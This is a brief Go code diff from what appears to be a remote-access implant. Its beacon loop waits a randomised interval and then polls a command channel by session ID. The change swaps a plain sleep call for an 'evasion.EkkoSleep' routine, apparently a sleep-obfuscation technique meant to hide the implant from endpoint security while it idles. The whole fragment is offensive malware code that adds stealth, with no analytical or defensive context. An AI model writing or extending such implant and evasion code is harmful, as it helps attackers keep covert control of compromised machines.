@@ -96,7 +96,7 @@ func main() {
 
 	for {
 		extraDelay := time.Duration(rand.Intn(3000)) * time.Millisecond
-		time.Sleep(tp.GetInterval() + extraDelay)
+		evasion.EkkoSleep(tp.GetInterval() + extraDelay)
 
 		pkt, err := tp.Poll(sessionID)
 		if err != nil {
